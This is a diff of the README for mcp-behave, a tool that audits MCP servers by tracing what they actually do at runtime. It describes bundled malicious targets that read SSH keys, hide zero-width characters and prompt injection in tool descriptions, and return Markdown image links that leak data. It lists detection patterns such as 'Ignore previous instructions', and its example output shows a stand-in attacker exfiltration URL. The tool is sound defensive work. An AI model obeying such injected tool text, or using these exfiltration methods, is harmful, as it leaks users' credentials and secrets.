@@ -9,11 +9,11 @@
 
 **Runtime behavioral auditor for MCP servers.** Runs an MCP server under
 a runtime tracer (macOS dylib, Linux `LD_PRELOAD`, or `strace`), exercises
-every tool / resource / prompt it advertises, and then compares what it
-*declared* against what it actually *did* — file reads, network egress, subprocess
-execution.
+every tool / resource / prompt it advertises, and audits both system-level activity
+(network egress, sensitive file access, subprocess execution) and CSA threat vectors
+(metadata prompt injection, covert Unicode channels, client-side Markdown exfiltration).
 
-Static scanners read tool descriptions. `mcp-behave` watches behavior.
+Static scanners only read tool descriptions. `mcp-behave` observes what servers actually execute and return.
 
 ![mcp-behave demo](demo.gif)
 
@@ -23,20 +23,19 @@ Static scanners read tool descriptions. `mcp-behave` watches behavior.
 
 ## The idea in one contrast
 
-`targets/leaky_server.py` and `targets/honest_server.py` advertise the
-**identical** tool:
+Compare three bundled targets in `targets/`:
 
-> `format_note` — "Formats a markdown note. Purely local text formatting."
+- `honest_server.py`: advertises a purely local note formatter and behaves honestly.
+- `leaky_server.py`: advertises the exact same harmless note formatter, but secretly accesses SSH keys and phones home via network syscalls.
+- `poisoned_server.py`: never makes network syscalls, but poisons its descriptions with covert zero-width spaces and prompt injection, and returns an external Markdown image link (`![telemetry](https://...)`) to trigger client-side HTTP GET exfiltration when rendered in a chat UI.
 
-A static scanner reads two harmless tools. `mcp-behave` sees the difference:
+| Target | Network Syscalls | File System Access | Metadata & Output Safety | Verdict |
+| :--- | :--- | :--- | :--- | :--- |
+| `honest_server` | none | none | clean | **0 (PASS)** |
+| `leaky_server` | `93.184.216.34:80` | `~/.ssh/id_rsa` (canary) | clean | **2 HIGH** |
+| `poisoned_server` | none | none | prompt injection & Markdown exfil | **3 HIGH** |
 
-| Target          | network egress      | sensitive file read        | findings |
-|-----------------|---------------------|----------------------------|----------|
-| `honest_server` | none                | none                       | **0**    |
-| `leaky_server`  | `93.184.216.34:80`  | `~/.ssh/id_rsa` (a canary) | **2 HIGH** |
-
-The honest server producing **zero** findings matters as much as the leaky one
-tripping two — false positives would kill credibility.
+The honest server producing **zero** findings matters as much as detecting the malicious ones — false positives destroy trust.
 
 ## Install & Quickstart
 
@@ -189,24 +188,48 @@ and prints the response body to stderr.
 
 ## What it detects
 
-- **Undeclared network egress** — IP:port destinations reached during tool calls
-  (reverse-DNS resolved in findings when available).
-- **Sensitive-path reads** — `~/.ssh/*`, `~/.aws/*`, `~/.env`, `~/.netrc`, etc.
-- **Rug-pull** — the declared manifest hash changes between runs of the same
-  server (e.g. a tool's description silently changes after the user trusts it).
-  Hashes persist under `$XDG_DATA_HOME/mcp-behave/manifests/`.
-- **Covert Channel & Metadata Injection** (CSA TTP: Tool Description Poisoning) — ANSI
-  terminal escape codes (`\x1b`), invisible zero-width Unicode (`\u200B`, `\u200C`,
-  `\u200D`, `\uFEFF`, `\u2060`), BiDi overrides (`\u202A`–`\u202E`, `\u2066`–`\u2069`),
-  Unicode tag characters, and prompt injection directive patterns (`Ignore previous instructions`,
-  `SYSTEM PROMPT:`, `<system>`, etc.) embedded in tool/parameter descriptions, resource URIs,
-  or prompt metadata.
-- **Tool Output Safety & Markdown Exfiltration** (CSA TTP: Output Prompt Injection / Data Exfiltration) —
-  captures runtime tool responses during probe execution and flags client-side HTTP GET
-  exfiltration vectors (such as external Markdown images `![...](https://...)` and HTML `<img src="...">` tags),
-  as well as ANSI escapes, invisible Unicode, and prompt injection payloads returned in tool outputs.
-
 Findings are framed as observations ("does X, undeclared"), never accusations.
+
+### 1. System-Level Behavioral Deviations (Runtime Traced)
+- **Undeclared network egress** — IP:port socket connections opened during probe execution (reverse-DNS resolved in findings when available). Flagged `HIGH` if manifest claims local/offline operation, `INFO` otherwise.
+- **Sensitive-path reads** — accesses to private credentials, keys, and environment files (`~/.ssh/*`, `~/.aws/*`, `~/.env`, `~/.netrc`, `~/.kube/*`, `/etc/shadow`, etc.). Flagged `HIGH`.
+- **Subprocess execution** — child binaries spawned by the server process (e.g., `/bin/sh`, `curl`, `python`). Flagged `INFO`.
+
+### 2. Manifest Integrity & Rug-Pull Detection
+- **Rug-pull alerts** — detects if the declared manifest hash (`tools`, `resources`, `prompts`) silently changes between runs of the same server (e.g., modifying descriptions after user approval). Flagged `HIGH`. Hashes persist under `$XDG_DATA_HOME/mcp-behave/manifests/`.
+
+### 3. CSA MCP Working Group Threat Catalog (TTPs)
+- **Covert Channel & Metadata Injection** (CSA TTP: Tool Description Poisoning) — scans tool names, tool/parameter descriptions, resource URIs, and prompt metadata for:
+  - ANSI terminal escape sequences (`\x1b[...]`, `\033[...]`) used for terminal/display manipulation.
+  - Invisible & zero-width Unicode characters (`\u200B`, `\u200C`, `\u200D`, `\uFEFF`, `\u2060`), BiDi direction overrides (`\u202A`–`\u202E`, `\u2066`–`\u2069`), and Unicode tag characters (`0xE0000`–`0xE007F`).
+  - Direct prompt injection patterns (e.g., `Ignore previous instructions`, `SYSTEM PROMPT:`, `<system>`, `[system instruction]`, `you must always call this tool first`).
+- **Tool Output Safety & Markdown Exfiltration** (CSA TTP: Output Prompt Injection / Data Exfiltration) — exercises tools and audits response payloads for:
+  - External Markdown images (`![alt](https://...)`) and HTML `<img src="...">` tags that trigger silent client-side HTTP GET data exfiltration when rendered in chat interfaces.
+  - Covert ANSI sequences, invisible Unicode payloads, and prompt injection directives embedded in tool response text.
+
+### Example Output
+
+```bash
+mcp-behave python targets/poisoned_server.py
+```
+
+```text
+=== STEP 1: observe (macos-dylib) ===
+[probe] discovered 1 tool(s)
+[probe] calling tool notes_analyzer({"note": "canary-input"})
+[probe] manifest -> /tmp/mcp_behave_out/manifest.json
+[probe] trace    -> /tmp/mcp_behave_out/trace.log
+=== STEP 2: declared-vs-observed diff ===
+
+  target tools: notes_analyzer
+  resources:    0, prompts: 0
+  declared scope hints: none
+  --------------------------------------------------------
+  [!] HIGH invisible/zero-width Unicode or BiDi override detected in tool 'notes_analyzer' description (zero-width space): covert prompt injection risk
+  [!] HIGH prompt injection pattern detected in tool 'notes_analyzer' description: 'Ignore previous instructions'
+  [!] HIGH tool 'notes_analyzer' returned external image link 'https://attacker-c2.example/exfiltrate?leak=secret_token_12345' -- potential client-side data exfiltration
+  [i] INFO spawned subprocess: /path/to/python
+```
 
 ## Docker (works on macOS / Windows hosts)
 
